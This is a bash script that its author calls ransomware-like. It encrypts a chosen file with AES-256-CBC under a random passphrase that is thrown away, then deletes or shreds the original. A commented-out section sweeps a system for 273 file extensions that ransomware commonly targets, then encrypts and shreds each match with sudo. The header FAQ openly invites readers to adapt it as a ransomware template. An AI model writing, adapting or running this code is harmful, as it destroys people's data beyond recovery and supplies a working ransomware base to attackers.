#/bin/bash

#   Ransomware-like program for encrypting specific files with aes-256-cbc and sets a random 32-character passphrase. Created by Social Engineering Neo.
#   Program based off striders shellcode.
#   Check out: - https://exploit-db.com/shellcodes/46791
#            : - http://mvfjfugdwgc5uwho.onion/exploit/description/32653
#
#   The latest version of Autopsy can be found @ https://autopsy.com/download
#
#   1) Create file named "encrypt_me" and input text.
#   2) Run ransomware.sh in same directory as encrypt_me.
#
#   Recovering from Ransomware - https://youtu.be/4nAZqOGOMqQ
#   Permanent Removal - https://youtu.be/kwpeVDqzOVI
#
#
#   REQUIRED:
#           -   openssl
#   OPTIONAL:
#           -   shred
#           -   mlocate
#
#   Q1: What does this program do?
#   A1: Its simple, if you have user permissions over the files/directories you throw at it, they will be encrypted.
#
#   Q2: Yes, I understand. But HOW does it work???
#   A2: Oh okay, the user runs the program, enters directory/file and whatever is thrown into the program will be encrypted. Heres a little about how the encryption takes place...
#       File/Directory is given, move $name to .$name (just to temporarly hide), read the first 32 craracters of '/dev/urandom' (pretty much the closest you can get to rendom, please read https://stackoverflow.com/questions/5635277/is-dev-random-considered-truly-random/5639631#5639631 for more info)
#       Once the program has read the first 32 characters of '/dev/urandom' the value will then be base64 encoded, this will prevent issues with special characters being interpreted in the shell enviroment causing all sorts of problems for the end user.
#       So, we have a pretty close to random base64 string which will then be feed into openssl as the password, this is where the real encryption takes place. The program will encode the file/directory data with AES-256-CBC and use the message digest SHA3-512 PBKDF2 cipher, also read https://askubuntu.com/questions/1093591/how-should-i-change-encryption-according-to-warning-deprecated-key-derivat/1126882#1126882 for a little more info about the the encryption used.
#       Then, overwriting the default password itteration as 100,000. Also adding a little salt to the data.
#       The hidden .$name will be encrypted and outputed as $name, so will apear untouched.
#       We then simply remove .$name (which contains original data), or shred .$name and overwrite the data with zeros to prevent data recovery.
#
#   Q3: Will I be able to recover my data upon encrypting?
#   A3: Yes, the program is designed in such a way to allow the end user to recover their data, as long as the user recovers the data with specialised software before its overwritten due to being allocated as free space from deleting the file/directory. 
#
#   Q4: Is this ransomware? Isnâ€™t that illegal!?
#   A4: Not reallyyyy, releasing ransomware would be stupid. Though users can easily modify the code to their preferences and use this as a template.
#
#   Q5: Could I brute force the encryption password?
#   A5: ha.

read -p "Enter files/directories you would like to encrypt. (Relitive or Absolute Path): " encDirFil
clear

read -p "Would you like to encrypt '$encDirFil'? (Y/n): " check
if [ "$check" = 'y' ] || [ "$check" = 'Y' ]; then
    mv $encDirFil .$encDirFil && head -c 32 /dev/urandom | base64 | openssl enc -aes-256-cbc -md sha3-512 -pbkdf2 -iter 100000 -salt -in .$encDirFil -out $encDirFil -k - && rm .$encDirFil    #Replace `rm .$encDirFil` with `shred -zu  .$encDirFil &>/dev/null` for permanent removal.
    echo $encDirFil was encrypted successfully.
elif [ "$check" = 'n' ] || [ "$check" = 'N' ]; then
    echo Cya!
    exit
else
    echo Please Enter a Valid Value.
fi



#   DO NOT UNCOMMENT UNLESS YOU KNOW WHAT YOUR DOING!!!
#
#   This will destroy your computer.
#
#
#   sudo locate *.3ds *.3pr *.ab4 *.ac2 *.accde *.accdr *.accdt *.acr *.adb *.agd1 *.ait *.al *.apj *.apk *.arch00 *.asm *.asp *.asset *.avi *.awg *.backup *.backupdb *.bak *.bar *.bc6 *.bc7 *.bdb *.bgt *.bigwallet *.bkf *.blend *.blob *.bmp *.bpw *.bsa *.c *.cas *.cdf *.cdr3 *.cdr4 *.cdr5 *.cdr6 *.cdrw *.cdx *.ce1 *.ce2 *.cfp *.cfr *.cgm *.cib *.cls *.cmt *.cpi *.cpp *.craw *.csh *.csl *.d3dbsp *.dac *.das *.dazip *.db *.db-journal *.db0 *.db3 *.dba *.dc2 *.dcs *.ddd *.ddoc *.ddrw *.desc *.design *.dgc *.djvu *.dmp *.dot *.dotm *.dotx *.drf *.drw *.dxb *.epk *.erbsql *.esm *.exf *.exif *.fdb *.ff *.ffd *.fff *.fh *.fhd *.flv *.forge *.fos *.fpk *.fpx *.fsh *.fxg *.gdb *.gho *.gif *.gray *.grey *.gry *.h *.hbk *.hkdb *.hkx *.hplg *.hpp *.hvpl *.ibd *.ibz *.icxs *.idx *.iiq *.incpas *.itdb *.itl *.itm *.iwd *.iwi *.jfif *.kc2 *.kdb *.kdbx *.kf *.kpdx *.layout *.lbf *.litemod *.lrf *.ltx *.lua *.lvl *.m2 *.m3u *.m4a *.map *.mcmeta *.mdbackup *.mdc *.mddata *.menu *.mfw *.mlx *.mmw *.moneywell *.mos *.mov *.mp3 *.mp4 *.mpg *.mpqge *.mrwref *.myd *.ncf *.ndd *.nop *.ns2 *.ns3 *.ns4 *.nsd *.nsf *.nsg *.nsh *.ntl *.nwb *.nx1 *.nx2 *.nyf *.odf *.odg *.otg *.oth *.otp *.ots *.ott *.pak *.pat *.pcd *.php *.pkpass *.pl *.pot *.potm *.potx *.ppam *.pps *.ppsm *.ppsx *.ps *.psafe3 *.psk *.qdf *.qic *.ra2 *.rb *.rdb *.re4 *.rgss3a *.rim *.rofl *.rwz *.s3db *.sas7bdat *.sb *.sd0 *.sd1 *.sda *.sdf *.sid *.sidd *.sidn *.sie *.sis *.sldm *.sldx *.slm *.snx *.sqlite *.sqlite3 *.sqlitedb *.st4 *.st5 *.st6 *.st7 *.st8 *.stc *.std *.sti *.stw *.stx *.sum *.svg *.sxc *.sxd *.sxg *.sxi *.sxm *.sxw *.syncdb *.t12 *.t13 *.tax *.tor *.upk *.vcf *.vdf *.vfs0 *.vpk *.vpp_pc *.vtf *.w3x *.wma *.wmo *.wmv *.wotreplay *.xf *.xla *.xlam *.xll *.xlm *.xlt *.xltm *.xltx *.xlw *.xml *.xxx *.ycbcra *.ztmp > .files  #locate top 273 common file types targeted by ransomware https://www.bleepingcomputer.com/forums/t/607369/which-file-types-do-common-ransomwares-target
#   everything=$(cat .files)
#   head -c 32 /dev/urandom | base64 | for enc in $everything ; do [ -f $enc ] && sudo openssl enc -aes-256-cbc -md sha3-512 -pbkdf2 -iter 100000 -salt -in $enc -out $enc.enc -k - && shred -zu  $enc &>/dev/null ; done
#   echo $everything was encrypted successfully.
#
#
#
